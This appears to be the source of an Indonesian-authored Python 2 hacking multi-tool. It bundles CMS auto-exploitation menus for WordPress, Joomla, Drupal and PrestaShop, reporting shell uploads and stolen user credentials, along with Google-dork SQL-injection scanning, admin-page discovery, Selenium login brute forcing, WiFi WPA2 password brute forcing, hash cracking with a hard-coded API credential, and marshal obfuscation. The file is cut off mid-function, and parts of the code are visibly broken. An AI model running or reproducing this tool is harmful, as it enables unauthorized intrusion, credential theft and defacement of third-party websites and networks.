#!/usr/bin/env python
# encoding:utf8
#This tool not 100% original
#Cyaaa


#Importing Module
try:
	import sys, time, requests, os, json, random, re, httplib, marshal, uncompyle6, code, platform, bs4, argparse
	import datetime
	import selenium
	import os.path
	import time as t
	from uncompyle6.main import decompile
	from sys import stdout
	from selenium import webdriver
	from optparse import OptionParser
	from selenium.webdriver.common.keys import Keys
	from selenium.common.exceptions import NoSuchElementException
	import pywifi
	from pywifi import PyWiFi
	from random import choice
	from pywifi import const
	from pywifi import Profile
	from urllib import quote
	from bs4 import BeautifulSoup
	from googlesearch import search
except:
	print ("\033[93m Error in Importing Module")
	sys.exit(0)
#--------------------->>>>>>>>>>>>>.

class color:
   PURPLE = '\033[95m'
   CYAN = '\033[96m'
   DARKCYAN = '\033[36m'
   BLUE = '\033[94m'
   GREEN = '\033[92m'
   YELLOW = '\033[93m'
   RED = '\033[91m'
   BOLD = '\033[1m'
   UNDERLINE = '\033[4m'
   END = '\033[0m'
   CWHITE  = '\033[37m'

def clears():
        linux = 'clear'
        windows = 'cls'
        os.system([linux, windows][os.name == 'nt'])

def banner():
	clears()
	clear = "\x1b[0m"
	colors = [36, 32, 34, 35, 31, 33, 37, 91, 92, 93, 94, 95, 96, 97]
	x = """ \033[95m
	   _                                   _
	 _| |_ _____ _____ _____ _____ _____ _| |_
	|_   _|_____|_____|_____|_____|_____|_   _|
	  | |                                 | |
	  | |                Emm.. Hi         | |
	  | |               /                 | |
	  | |           ,__,                  | |
	  | |	        (oo)____              | |
	  | |	        (__)    )~            | |
	  | |	           ||--|| *           | |
	  | |                                 | |
	  | |                                 | |
	 _| |_ _____ _____ _____ _____ _____ _| |_
	|_   _|_____|_____|_____|_____|_____|_   _|
	  |_|                                 |_|

"""
	for N, line in enumerate(x.split("\n")):
		sys.stdout.write("\x1b[1;%dm%s%s\n" % (random.choice(colors), line, clear))
		time.sleep(0.05)	
	start()

def notfound():
	print ""
	print ('\033[97m'" Command not Found ")
	garoh = raw_input( '\033[97m' " [" '\033[93m' "b" '\033[97m' "]" '\033[93m' "ack" '\033[95m' " or " '\033[97m' "[" '\033[91m' "e" '\033[97m' "]" '\033[91m' "xit ? >> ")
	if garoh == "b" or garoh == "back":
		clears()
		banner()
	elif garoh == "e" or garoh == "exit":
		clears()
	else:
		notfound()

def start():
	try:
		home = raw_input('\033[97m'"( )"'\033[93m'"> ")
		if home == "help":
			help()
		elif home == "set tool" or home == "set tools":
			settool()
		elif home == "hello" or home == "hi":
			print "Hello to... :)"
			start()
		elif home == "w0w" or home == "wow":
			print "Jutaan orang tidak menyadari kan ? awowkoakowka "
			start()
		elif home == "show tool" or home == "show":
			showtool()
		elif home == "clears" or "clear":
			banner()
		elif home == "exit":
			clears()
		else:
			notfound()
			
	except KeyboardInterrupt:
		print ""
		print ('\033[97m'" User Press CTRL+C , Cancleled")
		print ""



def help():
	print ""
	print ('\033[97m'" set tool     :"'\033[93m'" Using Tools / set tools")
	print ('\033[97m'" show tool    :"'\033[93m'" Show Option Tools")
	print ('\033[97m'" clears       :"'\033[93m'" clears")
	print ('\033[97m'" exit         :"'\033[93m'" Exit"'\033[0m')
	print ""
	settool()

def showtool():
	print ""
	print ('\033[97m'" 1    :"'\033[93m'" Auto Exploit / Pentesting")
	print ('\033[97m'" 2    :"'\033[93m'" Information Gathering")
	print ('\033[97m'" 3    :"'\033[93m'" Cracker Anything")
	print ('\033[97m'" 4    :"'\033[93m'" Brute Force")
	print ('\033[97m'" 5    :"'\033[93m'" Encrypt & Decrypt")
	print ""
	settool()


def settool():
	uset = raw_input('\033[97m'"("'\033[91m'"set tool"")"'\033[93m'"> ")
	if uset == "help":
		print ""
		print ('\033[97m'" use (number)         :"'\033[93m'" To using Tools (number) ")
		print ('\033[97m'" show tool            :"'\033[93m'" Show option Tools")
		print ('\033[97m'" back                 :"'\033[93m'" Back")
		print ""
		start()
	elif uset == "show tool":
		showtool()
	elif uset == "back":
		start()
	elif uset == "use 1":
		usetool1()

	else:
		print ""
		print ('\033[97m'" Command not Found ")
		garoh = raw_input( '\033[97m' " [" '\033[93m' "b" '\033[97m' "]" '\033[93m' "ack" '\033[95m' " or " '\033[97m' "[" '\033[91m' "e" '\033[97m' "]" '\033[91m' "xit ? >> ")
		if garoh == "b" or garoh == "back":
			settool()
		elif garoh == "e" or garoh == "exit":
			clears()
		else:
			settool()


def usetool1():
	tool1 = raw_input('\033[97m'"("'\033[91m'"use tool 1"")"'\033[93m'"> ")
	if tool1 == "run":
		pentest()
	elif tool1 == "run wp" or tool1 == "run wordpress":
		wp()
	elif tool1 == "run joomla" or tool1 == "run Joomla":
		joomla()
	elif tool1 == "run presta" or tool1 == "run prestashop":
		presta()
	elif tool1 == "run drupal" or tool1 == "Drupal":
		drupal()
	elif tool1 == "run os" or tool1 == "run oscommerce":
		osc()
	elif tool1 == "run ocart" or tool1 == "run opencart":
		ocart()
	elif tool1 == "back":
		start()
	elif tool1 == "help":
		print ""
		print ('\033[97m'" run        :"'\033[93m'" Running All Exploit")
		print ('\033[97m'" run wp     :"'\033[93m'" Exploit for Wordpress only")
		print ('\033[97m'" run presta :"'\033[93m'" Exploit for PrestaShop only")
		print ('\033[97m'" run joomla :"'\033[93m'" Exploit for Joomla ! only")
		print ('\033[97m'" run drupal :"'\033[93m'" Exploit for Drupal only")
		print ('\033[97m'" run os     :"'\033[93m'" Exploit for OsCommerce only")
		print ('\033[97m'" run ocart  :"'\033[93m'" Exploit for OpenCart only")
		print ('\033[97m'" ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~")
		print ('\033[97m'" back       :"'\033[93m'" Back")
		print ""
		return usetool1()
	else:
		notfound()

def usetool2():
	tool2 = raw_input('\033[97m'"("'\033[91m'"use tool 2"")"'\033[93m'"> ")
	if tool2 == "run":
		dork()
	elif tool2 == "back":
		start()
	elif tool2 == "help":
		print ""
		print ('\033[97m'" run        :"'\033[93m'" Running tools")
		print ('\033[97m'" back       :"'\033[93m'" Back")
		print ""
		return usetool2()
	else:
		notfound()

def usetool3():
	tool3 = raw_input('\033[97m'"("'\033[91m'"use tool 3"")"'\033[93m'"> ")
	if tool3 == "run":
		adlog()
	elif tool3 == "help":
		print ""
		print ('\033[93m'" How to Use !")
		print ('\033[93m'" 1) Find the target and view-source by (view-source:http://web.com)")
		print ('\033[93m'" 2) See the Selector of Username, Password, and Login Button")
		print ('\033[93m'" 3) Copy and Enjoy :v")
		print ('\033[97m'" ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~")
		print ('\033[97m'" run        :"'\033[93m'" Running tools")
		print ('\033[97m'" back       :"'\033[93m'" Back")
		print ""
		usetool3()
	elif tool3 == "back":
		start()
	else:
		notfound()

def usetool4():
	tool4 = raw_input('\033[97m'"("'\033[91m'"use tool 4"")"'\033[93m'"> ")
	if tool4 == "run":
		bf()
	elif tool4 == "back":
		start()
	elif tool4 == "help":
		print ""
		print ('\033[97m'" run        :"'\033[93m'" Running tools")
		print ('\033[97m'" back       :"'\033[93m'" Back")
		print ""
		usetool4()
	else:
		notfound()

def usetool5():
	tool5 = raw_input('\033[97m'"("'\033[91m'"use tool 5"")"'\033[93m'"> ")
	if tool5 == "run":
		wifibf()
	elif tool5 == "back":
		start()
	elif tool5 == "help":
		print ""
		print ('\033[97m'" run        :"'\033[93m'" Running tools")
		print ('\033[97m'" back       :"'\033[93m'" Back")
		print ""
		usetool5()
	else:
		notfound()

def usetool6():
	tool6 = raw_input('\033[97m'"("'\033[91m'"use tool 6"")"'\033[93m'"> ")
	if tool6 == "run":
		hasher()
	elif tool6 == "back":
		start()
	elif tool6 == "help":
		print ""
		print ('\033[97m'" run        :"'\033[93m'" Running tools")
		print ('\033[97m'" back       :"'\033[93m'" Back")
		print ""
		usetool6()
	else:
		notfound()

def usetool7():
	tool7 = raw_input('\033[97m'"("'\033[91m'"use tool 7"")"'\033[93m'"> ")
	if tool7 == "run":
		com()
	elif tool7 == "back":
		start()
	elif tool7 == "help":
		print ""
		print ('\033[97m'" run        :"'\033[93m'" Running tools")
		print ('\033[97m'" back       :"'\033[93m'" Back")
		print ""
		usetool7()
	else:
		notfound()

def dorkbanner():
	clears = "\x1b[0m"
	colors = [36, 32, 34, 35, 31, 37, 33]
	x = """
	    _         _              ____             _
	   / \  _   _| |_ ___       |  _ \  ___  _ __| | __
	  / _ \| | | | __/ _ \ _____| | | |/ _ \| '__| |/ /
	 / ___ \ |_| | || (_)  _____  |_| | (_) | |  |   <
	/_/   \_\__,_|\__\___/      |____/ \___/|_|  |_|\_\


	   [+]           Coded by Naufal Rifqi          [+]
	   [+]      Auto Dorking Using Google Agent     [+]
	   [+] If you Got any bug, report in my Github  [+]
	"""
	for N, line in enumerate(x.split("\n")):
		sys.stdout.write("\x1b[1;%dm%s%s\n" % (random.choice(colors), line, clears))
		time.sleep(0.05)

def adlog():
	red = '\033[31m'
	green = '\033[32m'
	yellow = '\033[33m'
	blue = '\033[34m'
	pink = '\033[35m'
	cyan = '\033[36m'
	white = '\033[37m'
	end = '\033[0m'
	whinew = '\033[97m'
	cyannew = '\033[96m'
	purnew = '\033[95m'
	bluenew = '\033[94m'
	yelnew = '\033[93m'
	grenew = '\033[92m'
	url = raw_input(" Url : ")
	clears()
	adlogbanner()
	print (bluenew + "[" + whinew + "Target" + bluenew + "]" + whinew + " =>" + red + " http://" + url)
	print ""
	wordfile = open("module/listadmin.txt", "r")
	wordlist = wordfile.readlines()
	wordfile.close()		
	for word in wordlist:
		dirku = word.strip("\n")
		dirku = "/" + dirku
		target = url + dirku
		connection = httplib.HTTPConnection(url)
		connection.request("GET", dirku)
		response = connection.getresponse()
					
		if response.status == 200:
			print "\033[97m [+] \033[93mAdmin Login Page >>> " + target
			print""
		else:
			print ("\033[93m [-] Trying " + dirku)

	usetool3()

def dork():
	clears()
	dorkbanner()
	foundUrls = []
	dork = raw_input(" \033[96m[+] \033[93mDork => \033[97")
	finalDork = dork
	searchAmount = int(input(" \033[96m [+] \033[93mPage => \033[97"))
	print("\nSearching and testing...\n")
	for x in search(finalDork, tld='com', lang='en', num=searchAmount, start=0, stop=searchAmount, pause=2.0):
	    url = x + "'"
	    res = requests.get(url)
	    html_page = res.content
	    soup = BeautifulSoup(html_page, 'html.parser')
	    text = soup.find_all(text=True)
	    for y in text:
	        if y.find("You have an error in your SQL") != -1:
	            foundUrls.append(x)
	            print (" \033[96m[+] \033[93mVuln =>", x)
	        else:
	            foundUrls.append(x)
	            print (" \033[96m[+] \033[91mNot Vuln =>", x)
	print ""
	usetool2()


def hasher():
	clears()
	bannerhash()
	hashe = raw_input(" [?] Hash >> ")
	tipe = raw_input( " [?] Type Hash >> ")
	email = "nbb85353@zwoho.com"
	code = "9c512744205f079c"
	try:
		req = requests.get('https://md5decrypt.net/Api/api.php?hash='+hashe+"&hash_type="+tipe+"&email="+email+"&code="+code)
		code = (req.text)
		print ('\033[93m\n Result => ')
		if 'CODE ERREUR : 001' in str(code):
			print ('\033[93m\n Sorry, Its not unLimited ')
		elif 'CODE ERREUR : 002' in str(code):
			print ('\033[93m\n Wrong Email / Code ')
		elif 'CODE ERREUR : 003' in str(code):
			print ('\033[93m\n Hash must lower than 400 character')
		elif 'CODE ERREUR : 004' in str(code):
			print ('\033[93m\n Server dont have Type of Hash ')
		elif 'CODE ERREUR : 005' in str(code):
			print ('\033[93m\n Hash is not valid with Type Hash')
		elif 'CODE ERREUR : 006' in str(code):
			print ('\033[93m\n You Must Input Hash')
		else:
			print ('\033[93m\n Unknown Error')
	except:
		print ('\033[93m\n Request Timeout / You are Offline')
		print ""
		usetool6()


def bannerhash():
	clears = "\x1b[0m"
	colors = [36, 32, 34, 35, 31, 37, 33]
	x = """
	   _           ____ ____  _
	  | |__   __ _/ ___/ ___|| |__   ___ _ __
	  | '_ \ / _` \___ \___ \| '_ \ / _ \ '__|
	  | | | | (_| |___) |__) | | | |  __/ |
	  |_| |_|\__,_|____/____/|_| |_|\___|_|

    [+]           Coded by Naufal Rifqi          [+]
    [+]     Cracking Hash Using API from Web     [+]
    [+] If you Got any bug, report in my Github  [+]

	"""
	for N, line in enumerate(x.split("\n")):
		sys.stdout.write("\x1b[1;%dm%s%s\n" % (random.choice(colors), line, clears))
		time.sleep(0.05)

def bannercom():
	clears = "\x1b[0m"
	colors = [36, 32, 34, 35, 31, 37, 33]
	x = """
	 ____         ____                  _
	|  _ \ _   _ / ___|_ __ _   _ _ __ | |_ ___  _ __
	| |_) | | | | |   | '__| | | | '_ \| __/ _ \| '__|
	|  __/| |_| | |___| |  | |_| | |_) | || (_) | |
	|_|    \__, |\____|_|   \__, | .__/ \__\___/|_|
	       |___/            |___/|_|

    	[+]           Coded by Naufal Rifqi          [+]
    	[+]       Compyle and Uncompyle Marshal      [+]
    	[+] If you Got any bug, report in my Github  [+]
	"""
	for N, line in enumerate(x.split("\n")):
		sys.stdout.write("\x1b[1;%dm%s%s\n" % (random.choice(colors), line, clears))
		time.sleep(0.05)

def com():
	clears()
	bannercom()
	print ("\033[93m Choose :")
	print ("\033[91m 1. compyle Marshal")
	print ("\033[92m 2. uncompyle Marshal")
	opo = raw_input("\033[97m => ")
	if opo == "1" or opo == "compyle Marshal":
		file = raw_input(" File => ")
		try:
			buka = open(file).read()
			compy = compile(buka,'','exec')
			gas = marshal.dumps(compy)
			has = open("compyle_" + file, 'w')
			has.write('import marshal\n')
			has.write('exec(marshal.loads('+repr(gas)+'))')
			has.close()
			time.sleep(1)
			print ""
			print (" Success => compyle_"+file)
			print ""
			usetool7()
		except:
			print ""
			print "\033[94m No Such File Directory "
			print ""
			usetool7()
	elif opo == "2" or opo == "uncompyle Marshal":
		print ""
		output = raw_input(" [-] Output : ")
		try:
			a = marshal.loads(code.py2)
			temptext = ""
			
			#done = (" Success => "+output)
			with open(output, "w") as abc:
				with abc as sys.stdout:
					decompile(2.7,a, sys.stdout)
					abc.close()
			
			print ("Success => " + output)
			usetool7()
		except:
			pass
	else:
		notfound()

def bannerbf():
    clears = "\x1b[0m"
    colors = [36, 32, 34, 35, 31, 37, 33]
    x = """
         ____             _         _____
        | __ ) _ __ _   _| |_ ___  |  ___|
        |  _ \| '__| | | | __/ _ \ | |_
        | |_) | |  | |_| | ||  __/ |  _|
        |____/|_|   \__,_|\__\___| |_|

    [+]           Coded by Naufal Rifqi          [+]
    [+]     Brute Force Website Using Selector   [+]
    [+] If you Got any bug, report in my Github  [+]
    """
    for N, line in enumerate(x.split("\n")):
        sys.stdout.write("\x1b[1;%dm%s%s\n" % (random.choice(colors), line, clears))
        time.sleep(0.05)

def adlogbanner():
	clears = "\x1b[0m"
	colors = [36, 32, 34, 35, 31, 37, 33]
	x = """
	    _       _ _               _____ _           _
	   / \   __| | | ___   __ _  |  ___(_)_ __   __| | ___ _ __
	  / _ \ / _` | |/ _ \ / _` | | |_  | | '_ \ / _` |/ _ \ '__|
	 / ___ \ (_| | | (_) | (_| | |  _| | | | | | (_| |  __/ |
	/_/   \_\__,_|_|\___/ \__, | | |   |_|_| |_|\__,_|\___|_|
	                      |___/  | |
	                             |_| github.com/Miyazono45 

	    [+]           Coded by Naufal Rifqi          [+]
	    [+]       Auto Detector Admin Page Login     [+]
	    [+] If you Got any bug, report in my Github  [+]

	"""
	for N, line in enumerate(x.split("\n")):
		sys.stdout.write("\x1b[1;%dm%s%s\n" % (random.choice(colors), line, clears))
		time.sleep(0.05)	

def bannerwifi():
	clears = "\x1b[0m"
	colors = [36, 32, 34, 35, 31, 37, 33]
	x = """
	__        ___  __ _       ____  _____
	\ \      / (_)/ _(_)     | __ )|  ___|
	 \ \ /\ / /| | |_| |_____|  _ \| |_
	  \ V  V / | |  _|  _____  |_) |  _|
	   \_/\_/  |_|_| | |     |____/|_|
	                 |_|

   [+]           Coded by Naufal Rifqi          [+]
   [+]       Wifi Brute Force using Wordlist    [+]
   [+] If you Got any bug, report in my Github  [+]

	   """
	for N, line in enumerate(x.split("\n")):
		sys.stdout.write("\x1b[1;%dm%s%s\n" % (random.choice(colors), line, clears))
		time.sleep(0.05)

def wifibf():
	try:
		wifi = PyWiFi()
		ifaces = wifi.interfaces()[0]
		ifaces.scan()
		results = ifaces.scan_results()

		wifi = pywifi.PyWiFi()
		iface = wifi.interfaces()[0]
	except:
		print ""
		print ('\033[91m Error, \033[93mMaybe this Tools only For Linux')
		time.sleep(1)
		print ""
		usetool5()

	type = False
	clears()
	bannerwifi()
	ssid = raw_input('\033[93m [?] SSID => ')
	filee = raw_input('\033[93m [?] Password Files => ')
	print ""
	if os.path.exists(filee):
		pwd(ssid, filee)
	else:
		print ("\033[93m No Such File Directory")
		usetool5()

def gas(ssid, password, number):
	profile = Profile()
	profile.ssid = ssid
	profile.auth = const.AUTH_ALG_OPEN
	profile.akm.append(const.AKM_TYPE_WPA2PSK)
	profile.cipher = const.CIPHER_TYPE_CCMP

	profile.key = password
	iface.remove_all_network_profiles()
	tmp_profile = iface.add_network_profile(profile)
	time.sleep(1)
	iface.connect(tmp_profile)
	time.sleep(1)

	if ifaces.status() == const.IFACE_CONNECTED:
		time.sleep(0.5)
		print ('\033[93m\n Crack Success')
		time.sleep(1)
		print ('\033[95m\n Password => ' + password)			
		time.sleep(1)
	else:
		print ('\033[91m\n Sorry, Crack Failed using {}'.format(number, password))

def pwd(ssid, file):
	number = 0
	with open(file, 'r', encoding='utf-8') as words:
		for line in words:
			number += 1
			line = line.split("\n")
			gas(ssid, pwd, number)

#kebutuhan hasil exploit -------->
def berhasil(vulner):
	whinew = '\033[97m'
	cyannew = '\033[96m'
	purnew = '\033[95m'
	bluenew = '\033[94m'
	yelnew = '\033[93m'
	grenew = '\033[92m'
	print (whinew + "	[" + yelnew + "+" + whinew + "]" + purnew + " Index Uploaded" + grenew + vulner)

def gagal(yggagal):
	whinew = '\033[97m'
	cyannew = '\033[96m'
	purnew = '\033[95m'
	bluenew = '\033[94m'
	yelnew = '\033[93m'
	grenew = '\033[92m'
	rednew = '\033[91m'
	print (whinew + "	[" + yelnew + "-" + whinew + "]" + purnew + " " + grenew + yggagal + whinew + " [" + rednew + "NotVuln" + whinew + "]")

def hasilshell(pathshell):
	whinew = '\033[97m'
	cyannew = '\033[96m'
	purnew = '\033[95m'
	bluenew = '\033[94m'
	yelnew = '\033[93m'
	grenew = '\033[92m'
	print (whinew + "	[" + yelnew + "+" + whinew + "]" + purnew + " Shell Uploaded" + grenew + pathshell)

def hasiltext(pathtext):
	whinew = '\033[97m'
	cyannew = '\033[96m'
	purnew = '\033[95m'
	bluenew = '\033[94m'
	yelnew = '\033[93m'
	grenew = '\033[92m'
	print (whinew + "	[" + yelnew + "+" + whinew + "]" + purnew + " Text Uploaded" + grenew + pathtext)

def hasilindex(pathindex):
	whinew = '\033[97m'
	cyannew = '\033[96m'
	purnew = '\033[95m'
	bluenew = '\033[94m'
	yelnew = '\033[93m'
	grenew = '\033[92m'
	print (whinew + "	[" + yelnew + "+" + whinew + "]" + purnew + " Index Uploaded" + grenew + pathindex)

def vuln(namevuln):
	whinew = '\033[97m'
	cyannew = '\033[96m'
	purnew = '\033[95m'
	bluenew = '\033[94m'
	yelnew = '\033[93m'
	grenew = '\033[92m'
	print (whinew + "	[" + yelnew + "+" + whinew + "]" + purnew + " Vuln!! " + grenew + namevuln)


def userpass(username, password):
	whinew = '\033[97m'
	cyannew = '\033[96m'
	purnew = '\033[95m'
	bluenew = '\033[94m'
	yelnew = '\033[93m'
	grenew = '\033[92m'
	print (whinew + "	[" + yelnew + "+" + whinew + "]" + purnew + " Getting UserPass")
	print (whinew + "		[" + yelnew + "+" + whinew + "]" + cyannew + " Username : " + whinew + username)
	print (whinew + "		[" + yelnew + "+" + whinew + "]" + cyannew + " Password : " + whinew + password)

def getconfig(pathconfig):
	whinew = '\033[97m'
	cyannew = '\033[96m'
	purnew = '\033[95m'
	bluenew = '\033[94m'
	yelnew = '\033[93m'
	grenew = '\033[92m'
	print (whinew + "	[" + yelnew + "+" + whinew + "]" + purnew + " Getting Config")
	print (whinew + "		[" + yelnew + "+" + whinew + "]" + cyannew + " Config : " + whinew + pathconfig)


#end ------------->
def bannerpentest():
	clears = "\x1b[0m"
	colors = [36, 32, 34, 35, 31, 37, 33]
	x = """
	    _         _        ____            _            _
	   / \  _   _| |_ ___ |  _ \ ___ _ __ | |_ ___  ___| |_ ___ _ __
	  / _ \| | | | __/ _ \| |_) / _ \ '_ \| __/ _ \/ __| __/ _ \ '__|
 	 / ___ \ |_| | || (_) |  __/  __/ | | | ||  __/\__ \ ||  __/ |
	/_/   \_\__,_|\__\___/| |   \___|_| |_|\__\___||___/\__\___|_|
	                      | |
	                      |_|         github.com/Miyazono45 

	    [+]           Coded by Naufal Rifqi          [+]
	    [+]     45 Exploiter + Auto Detect CMS       [+]
	    [+] If you Got any bug, report in my Github  [+]

	 """
	for N, line in enumerate(x.split("\n")):
		sys.stdout.write("\x1b[1;%dm%s%s\n" % (random.choice(colors), line, clears))
		time.sleep(0.05)			

def wp():
	whinew = '\033[97m'
	cyannew = '\033[96m'
	purnew = '\033[95m'
	bluenew = '\033[94m'
	yelnew = '\033[93m'
	grenew = '\033[92m'
	red = '\033[31m'
	url = raw_input('\033[97m'" Url : ")
	clears()
	bannerpentest()
	print (bluenew + "[" + whinew + "Target" + bluenew + "]" + whinew + " =>" + red + " http://" + url)
	print ""
	fckeditor(url)
	cherry(url)
	wysija(url)
	wp_fronted(url)
	hdwebplayer(url)
	addblocker(url)
	fromcraft(url)
	pageline(url)
	headway(url)
	wp_mobile(url)
	wp_job(url)
	wp_content_injection(url)
	viral_option(url)
	woocomerce(url)
	categorypageicon(url)

def joomla():
	whinew = '\033[97m'
	cyannew = '\033[96m'
	purnew = '\033[95m'
	bluenew = '\033[94m'
	yelnew = '\033[93m'
	grenew = '\033[92m'
	red = '\033[31m'
	url = raw_input('\033[97m'" Url : ")
	clears()
	bannerpentest()
	print (bluenew + "[" + whinew + "Target" + bluenew + "]" + whinew + " =>" + red + " http://" + url)
	print ""
	fckeditor(url)
	rce(url)
	comadsmanager(url)
	alberghi(url)
	com_fabric(url)
	Com_Hdflvplayer(url)
	com_myblog(url)
	com_macgallery(url)
	Com_CCkJseblod(url)
	Com_Jbcatalog(url)
	Com_SexyContactform(url)
	Com_Rockdownload(url)
	Com_facileforms(url)
	joomlabf(url)

def drupal():
	whinew = '\033[97m'
	cyannew = '\033[96m'
	purnew = '\033[95m'
	bluenew = '\033[94m'
	yelnew = '\033[93m'
	grenew = '\033[92m'
	red = '\033[31m'
	url = raw_input('\033[97m'" Url : ")
	clears()
	bannerpentest()
	print (bluenew + "[" + whinew + "Target" + bluenew + "]" + whinew + " =>" + red + " http://" + url)
	print ""
	fckeditor(url)
	drupalsqliadmin(url)
	drupalgedden2(url)
	drupalbf(url)

def osc():
	whinew = '\033[97m'
	cyannew = '\033[96m'
	purnew = '\033[95m'
	bluenew = '\033[94m'
	yelnew = '\033[93m'
	grenew = '\033[92m'
	red = '\033[31m'
	url = raw_input('\033[97m'" Url : ")
	clears()
	bannerpentest()
	print (bluenew + "[" + whinew + "Target" + bluenew + "]" + whinew + " =>" + red + " http://" + url)
	print ""
	fckeditor(url)
	oscommerce(url)

def presta():
	whinew = '\033[97m'
	cyannew = '\033[96m'
	purnew = '\033[95m'
	bluenew = '\033[94m'
	yelnew = '\033[93m'
	grenew = '\033[92m'
	red = '\033[31m'
	url = raw_input('\033[97m'" Url : ")
	clears()
	bannerpentest()
	print (bluenew + "[" + whinew + "Target" + bluenew + "]" + whinew + " =>" + red + " http://" + url)
	print ""
	fckeditor(url)
	lib(url)
	psmodthemeoptionpanel(url)
	megamenu(url)
	nvn_export_orders(url)
	pkflexmenu(url)
	wdoptionpanel(url)
	fieldvmegamenu(url)
	wg24themeadministration(url)
	videostab(url)
	cartabandonmentpro(url)
	cartabandonmentproOld(url)
	columnadverts(url)

def ocart():
	whinew = '\033[97m'
	cyannew = '\033[96m'
	purnew = '\033[95m'
	bluenew = '\033[94m'
	yelnew = '\033[93m'
	grenew = '\033[92m'
	red = '\033[31m'
	url = raw_input('\033[97m'" Url : ")
	clears()
	bannerpentest()
	print (bluenew + "[" + whinew + "Target" + bluenew + "]" + whinew + " =>" + red + " http://" + url)
	print ""
	fckeditor(url)
	opencart(url)

def bf():
    website = raw_input("Url : ")
    clears()
    bannerbf()
    sys.stdout.write(color.GREEN + '[!] '+color.CWHITE + 'Checking if site exists '),
    sys.stdout.flush()
    t.sleep(1)
    try:
        request = requests.get(website)
        if request.status_code == 200:
            print (color.GREEN + '[OK]'+color.CWHITE)
            sys.stdout.flush()
    except selenium.common.exceptions.NoSuchElementException:
        pass
    except KeyboardInterrupt:
        print (color.RED + '[!]'+color.CWHITE+ 'User used Ctrl-c to exit')
        exit()
    except:
        t.sleep(1)
        print (color.RED + '[X]'+color.CWHITE)
        t.sleep(1)
        print (color.RED + '[!]'+color.CWHITE+ ' Website could not be located make sure to use http / https or you are Offline')
        exit()

    username_selector = raw_input(color.GREEN + '[~] ' + color.CWHITE + 'Enter the username selector: ')
    password_selector = raw_input(color.GREEN + '[~] ' + color.CWHITE + 'Enter the password selector: ')
    login_btn_selector = raw_input(color.GREEN + '[~] ' + color.CWHITE + 'Enter the Login button selector: ')
    username = raw_input(color.GREEN + '[~] ' + color.CWHITE + 'Enter the username to brute-force: ')
    pass_list = raw_input(color.GREEN + '[~] ' + color.CWHITE + 'Enter a directory to a password list: ')
    brutes(username, username_selector ,password_selector,login_btn_selector,pass_list, website)

def brutes(username, username_selector ,password_selector,login_btn_selector,pass_list, website):
    f = open(pass_list, 'r')
    driver = webdriver.Chrome()
    optionss = webdriver.ChromeOptions()
    optionss.add_argument("--disable-popup-blocking")
    optionss.add_argument("--disable-extensions")
    count = 1 #count
    browser = webdriver.Chrome(chrome_options=optionss)
    while True:
        try:
            for line in f:
                browser.get(website)
                t.sleep(2)
                Sel_user = browser.find_element_by_css_selector(username_selector) #Finds Selector
                Sel_pas = browser.find_element_by_css_selector(password_selector) #Finds Selector
                enter = browser.find_element_by_css_selector(login_btn_selector) #Finds Selector
                # browser.find_element_by_css_selector(password_selector).clear()
                # browser.find_element_by_css_selector(username_selector).clear()
                Sel_user.send_keys(username)
                Sel_pas.send_keys(line)
                print '------------------------'
                print (color.GREEN + 'Tried password: '+color.RED + line + color.GREEN + 'for user: '+color.RED+ username)
                print '------------------------'
        except KeyboardInterrupt: #returns to main menu if ctrl C is used
            exit()
        except selenium.common.exceptions.NoSuchElementException:
            print 'AN ELEMENT HAS BEEN REMOVED FROM THE PAGE SOURCE THIS COULD MEAN 2 THINGS THE PASSWORD WAS FOUND OR YOU HAVE BEEN LOCKED OUT OF ATTEMPTS! '
            print 'LAST PASS ATTEMPT BELLOW'
            print color.GREEN + 'Password has been found: {0}'.format(line)
            print color.YELLOW + 'Have fun :)'
            usetool4()

def pentest():
	#Warna ---->
	red = '\033[31m'
	green = '\033[32m'
	yellow = '\033[33m'
	blue = '\033[34m'
	pink = '\033[35m'
	cyan = '\033[36m'
	white = '\033[37m'
	end = '\033[0m'
	whinew = '\033[97m'
	cyannew = '\033[96m'
	purnew = '\033[95m'
	bluenew = '\033[94m'
	yelnew = '\033[93m'
	grenew = '\033[92m'
	#warna ----->
	header = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Content-Type': 'application/x-www-form-urlencoded'
            }

	url = raw_input('\033[97m'" Url : ")
	clears()
	bannerpentest()
	print (bluenew + "[" + whinew + "Target" + bluenew + "]" + whinew + " =>" + red + " http://" + url)
	print ""
	print ("\033[97m-----------------------------------------------")
	print ("\033[97m[\033[93m+\033[97m] \033[97m" + "Checking for CMS")
	gifchecker = requests.get('http://' + url + '/admin/images/cal_date_over.gif', timeout=50, headers=header)
	checker = requests.get('http://' + url + '/templates/system/css/system.css', timeout=50, headers=header)
	cmschecker = requests.get('http://' + url, timeout=50, headers=header)
	#checking CMS and exploit ------->
	if '/engine.php?q=index.php?option=com_janews' in checker.text or checker.status_code == 200:
		print ("\033[97m[\033[96m~\033[97m] \033[93m" + url + "\033[34m [" + "\033[94m Joomla! " + "\033[34m] \033[0m")
		print ("\033[97m-----------------------------------------------")
		print ("\033[97m[\033[93m+\033[97m] \033[97m" + "Lets Check Vulnerability")
		##13
		fckeditor(url)
		rce(url)
		comadsmanager(url)
		alberghi(url)
		com_fabric(url)
		Com_Hdflvplayer(url)
		com_myblog(url)
		com_macgallery(url)
		Com_CCkJseblod(url)
		Com_Jbcatalog(url)
		Com_SexyContactform(url)
		Com_Rockdownload(url)
		Com_facileforms(url)
		joomlabf(url)
		print ""
		usetool1()
		print ("\033[97m-----------------------------------------------")
	elif '/wp-content/' in cmschecker.text:
		print ("\033[97m[\033[96m~\033[97m] \033[93m" + url + "\033[34m [" + "\033[94m Wordpress " + "\033[34m] \033[0m")
		print ("\033[97m-----------------------------------------------")
		print ("\033[97m[\033[93m+\033[97m] \033[97m" + "Lets Check Vulnerability")
		#14
		fckeditor(url)
		cherry(url)
		wysija(url)
		wp_fronted(url)
		hdwebplayer(url)
		addblocker(url)
		fromcraft(url)
		pageline(url)
		headway(url)
		wp_mobile(url)
		wp_job(url)
		wp_content_injection(url)
		viral_option(url)
		woocomerce(url)
		categorypageicon(url)
		print ""
		usetool1()
		print ("\033[97m-----------------------------------------------")
	elif '/sites/default/' in cmschecker.text or 'content="Drupal' in cmschecker.text:
